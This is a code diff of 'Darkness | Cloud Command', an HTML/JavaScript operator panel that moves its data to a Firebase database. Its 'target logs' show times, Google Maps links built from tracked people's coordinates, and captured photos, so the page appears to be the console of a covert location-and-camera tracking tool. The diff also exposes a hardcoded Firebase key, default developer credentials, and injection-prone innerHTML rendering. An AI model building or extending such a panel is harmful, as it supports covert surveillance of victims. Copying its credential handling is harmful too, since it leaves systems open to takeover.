@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Darkness | Markas Supreme</title>
+    <title>Darkness | Cloud Command</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         :root { --red: #ff0000; --bg: #000; --card: #080808; }
         body { background: var(--bg); color: #fff; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
@@ -12,18 +14,16 @@
         .header h1 { color: var(--red); margin: 0; font-size: 26px; letter-spacing: 5px; }
         .container { flex: 1; padding: 20px; overflow-y: auto; }
         .section { display: none; }
-        .section.active { display: block; animation: slideUp 0.3s; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .section.active { display: block; }
         .bottom-nav { background: #050505; height: 80px; display: flex; border-top: 1px solid #111; }
-        .nav-btn { flex: 1; background: none; border: none; color: #444; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.3s; }
+        .nav-btn { flex: 1; background: none; border: none; color: #444; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .nav-btn.active { color: #fff; border-top: 3px solid var(--red); }
         .nav-btn span { font-size: 24px; margin-bottom: 5px; }
         table { width: 100%; border-collapse: collapse; font-size: 13px; }
         th { color: var(--red); text-align: left; padding: 10px 5px; border-bottom: 1px solid #222; }
         td { padding: 15px 5px; border-bottom: 1px solid #111; }
         .btn-act { background: none; border: 1px solid var(--red); color: var(--red); padding: 8px 12px; font-size: 10px; cursor: pointer; font-weight: bold; }
-        .form-box { background: var(--card); padding: 15px; border-radius: 8px; margin-bottom: 25px; }
-        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #111; border: 1px solid #222; color: #fff; border-radius: 4px; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #111; border: 1px solid #222; color: #fff; }
         #login-screen { position: fixed; inset: 0; background: #000; z-index: 999; display: flex; align-items: center; justify-content: center; padding: 40px; }
     </style>
 </head>
@@ -36,32 +36,27 @@
         </div>
     </div>
 
-    <div class="banner">DEVELOPER KALZ | RMT SUPREME SYSTEM</div>
+    <div class="banner">DEVELOPER KALZ | RMT CLOUD SYSTEM</div>
     <div class="header"><h1>DARKNESS</h1><div id="uInf" style="font-size:10px; color:#444; margin-top:5px;"></div></div>
 
     <div class="container">
         <div id="t-track" class="section active">
-            <h3 style="font-size: 14px; margin-bottom: 10px;">🛰️ TARGET LOGS</h3>
             <table><thead><tr><th>WAKTU</th><th>MAPS</th><th>FOTO</th><th>X</th></tr></thead>
             <tbody id="l-track"></tbody></table>
         </div>
-
         <div id="t-acc" class="section">
-            <div class="form-box">
-                <h3 style="color:var(--red); margin:0 0 10px 0;">CREATE ACCOUNT</h3>
+            <div style="background:var(--card); padding:15px; margin-bottom:20px;">
                 <input type="text" id="nu" placeholder="USER"><input type="password" id="np" placeholder="PASS">
                 <select id="nr"><option value="member">MEMBER</option><option value="admin">ADMIN</option><option value="owner">OWNER</option></select>
-                <button class="btn-act" style="width:100%; margin-top:10px;" onclick="createAcc()">EXECUTE REGISTRY</button>
+                <button class="btn-act" style="width:100%; margin-top:10px;" onclick="createAcc()">CREATE OPERATIVE</button>
             </div>
-            <h3>OPERATIVES</h3>
             <table><thead><tr><th>USER</th><th>ROLE</th><th>ACT</th></tr></thead><tbody id="l-user"></tbody></table>
         </div>
-
         <div id="t-supp" class="section">
             <div style="border-left: 3px solid var(--red); padding:15px; background:var(--card);">
-                <p>LEAD: KALZ</p><p>SYNC: TELEGRAM ACTIVE</p><p>MEMORY: OFFLINE STABLE</p>
+                <p>LEAD: KALZ</p><p>DATABASE: CLOUD CONNECTED</p>
             </div>
-            <button class="btn-act" style="width:100%; margin-top:30px; padding:15px;" onclick="location.reload()">TERMINATE SESSION</button>
+            <button class="btn-act" style="width:100%; margin-top:30px; padding:15px;" onclick="location.reload()">OFFLINE MODE</button>
         </div>
     </div>
 
@@ -72,19 +67,51 @@
     </div>
 
 <script>
-    let users = JSON.parse(localStorage.getItem('darkness_users')) || [{u:"Kalz", p:"111", r:"developer"}];
+    // Konfigurasi Firebase Lu
+    const firebaseConfig = {
+        apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
+        databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
     let ses = null;
 
     function login() {
         const u = document.getElementById('uIn').value, p = document.getElementById('pIn').value;
-        const f = users.find(x => x.u === u && x.p === p);
-        if(f) {
-            ses = f; document.getElementById('login-screen').style.display = 'none';
-            document.getElementById('uInf').innerText = `ACCESS: ${u.toUpperCase()} | ROLE: ${f.r.toUpperCase()}`;
-            if(f.r !== 'developer') document.getElementById('n-acc').style.display = 'none';
-            loadT(); loadU(); 
-            setInterval(() => { if(!users.find(x => x.u === ses.u)) location.reload(); }, 3000);
-        } else alert("DENIED");
+        db.ref('users').once('value', s => {
+            const data = s.val() || { "Kalz": {p:"111", r:"developer"} };
+            if(data[u] && data[u].p === p) {
+                ses = {u, r: data[u].r};
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('uInf').innerText = `ACCESS: ${u.toUpperCase()} | ROLE: ${ses.r.toUpperCase()}`;
+                if(ses.r !== 'developer') document.getElementById('n-acc').style.display = 'none';
+                syncData();
+            } else alert("DENIED");
+        });
+    }
+
+    function syncData() {
+        // Sinkron Akun
+        db.ref('users').on('value', s => {
+            const b = document.getElementById('l-user'); b.innerHTML = '';
+            const data = s.val();
+            if(!data[ses.u]) location.reload(); // Force Logout
+            for(let u in data) {
+                if(data[u].r === 'developer') continue;
+                b.innerHTML += `<tr><td>${u}</td><td>${data[u].r}</td><td><button class="btn-act" onclick="delU('${u}')">X</button></td></tr>`;
+            }
+        });
+        // Sinkron Target
+        db.ref('targets').on('value', s => {
+            const b = document.getElementById('l-track'); b.innerHTML = '';
+            const data = s.val();
+            for(let id in data) {
+                const x = data[id];
+                const m = `https://www.google.com/maps?q=${x.lat},${x.lon}`;
+                b.innerHTML += `<tr><td>${x.time}</td><td><button class="btn-act" onclick="window.open('${m}')">📍 MAPS</button></td><td><button class="btn-act" onclick="reqF('${x.img}')">📸 FOTO</button></td><td><button class="btn-act" onclick="delT('${id}')">X</button></td></tr>`;
+            }
+        });
     }
 
     function tab(id, b) {
@@ -95,36 +122,15 @@
 
     function createAcc() {
         const u = document.getElementById('nu').value, p = document.getElementById('np').value, r = document.getElementById('nr').value;
-        if(u && p) { users.push({u, p, r}); save(); loadU(); alert("Operative Registered!"); }
+        if(u && p) db.ref('users/' + u).set({p, r});
     }
 
-    function loadU() {
-        const b = document.getElementById('l-user'); b.innerHTML = '';
-        users.forEach((x, i) => { if(x.r==='developer') return; b.innerHTML += `<tr><td>${x.u}</td><td>${x.r}</td><td><button class="btn-act" onclick="delU(${i})">X</button></td></tr>`; });
-    }
-
-    function delU(i) { if(confirm("FORCE LOGOUT?")) { users.splice(i, 1); save(); loadU(); } }
-
-    function loadT() {
-        const t = JSON.parse(localStorage.getItem('darkness_targets') || '[]');
-        const b = document.getElementById('l-track'); b.innerHTML = '';
-        t.forEach((x, i) => { 
-            const m = `https://www.google.com/maps?q=${x.lat},${x.lon}`;
-            b.innerHTML += `<tr><td>${x.time}</td><td><button class="btn-act" onclick="window.open('${m}')">📍 MAPS</button></td><td><button class="btn-act" onclick="reqF('${x.img}')">📸 FOTO</button></td><td><button class="btn-act" onclick="delT(${i})">X</button></td></tr>`; 
-        });
-    }
-
+    function delU(u) { if(confirm("FORCE LOGOUT?")) db.ref('users/' + u).remove(); }
+    function delT(id) { db.ref('targets/' + id).remove(); }
     function reqF(img) {
         const w = window.open("");
-        w.document.write(`<body style="background:#000;display:flex;align-items:center;justify-content:center;margin:0"><img src="${img}" style="max-width:100%;border:2px solid red;box-shadow:0 0 20px red;"></body>`);
+        w.document.write(`<body style="background:#000;display:flex;align-items:center;justify-content:center;margin:0"><img src="${img}" style="max-width:100%;border:2px solid red;"></body>`);
     }
-
-    function delT(i) {
-        let t = JSON.parse(localStorage.getItem('darkness_targets') || '[]'); t.splice(i, 1);
-        localStorage.setItem('darkness_targets', JSON.stringify(t)); loadT();
-    }
-
-    function save() { localStorage.setItem('darkness_users', JSON.stringify(users)); }
 </script>
 </body>
 </html>
